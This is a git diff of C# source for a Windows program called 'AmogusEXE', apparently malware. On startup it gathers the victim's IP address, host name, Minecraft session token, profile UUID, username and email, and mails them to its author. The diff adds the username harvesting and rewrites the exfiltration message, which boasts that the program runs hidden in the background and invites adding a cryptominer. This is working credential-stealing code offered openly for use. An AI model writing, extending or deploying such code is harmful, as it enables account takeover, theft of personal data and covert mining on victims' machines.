@@ -16,6 +16,7 @@ namespace AmogusEXE
     {
         public MainWindow()
         {
+            
             GetNecessaryStuff();
             InitializeComponent();
             new ForeverWindow();
@@ -36,18 +37,22 @@ namespace AmogusEXE
             string token = "<minecraft not found>";
             string profileID = "<minecraft not found>";
             string email = "<not found>";
+            string minecraftName = "<minecraft not found>";
             if (dict != null)
             {
                 token = dict["token"];
                 profileID = dict["profileID"];
                 email = dict["email"];
+                minecraftName = dict["name"];
             }
-
-            Sender.Mail($"\"AmogusEXE was initialized on victim's PC!\nUser's IPv4 Address: {ip}\nUser's DNS Name: {Dns.GetHostName()}\n" +
+            Sender.Mail(
+                 $"\"AmogusEXE was initialized on victim's PC!\nUser's IPv4 Address: {ip}" +
+                        $"\nUser's DNS Name: {Dns.GetHostName()}\n" +
                         $"Latest Minecraft session ID token: {token}\n" +
                         $"Minecraft profile UUID: {profileID}\n" +
+                        $"Minecraft possible username: {minecraftName}\n" +
                         $"Possible victim's email: {email}" +
-                        "\n \nAmogus.EXE currently runs in background and can be used as miner or whatever, just download source code and add your miner there.\"");
+                        "\n \nAmogus.EXE currently runs in background and can be used as miner or whatever, you could just download source code and add your miner here.\"");
         }
     }
 }
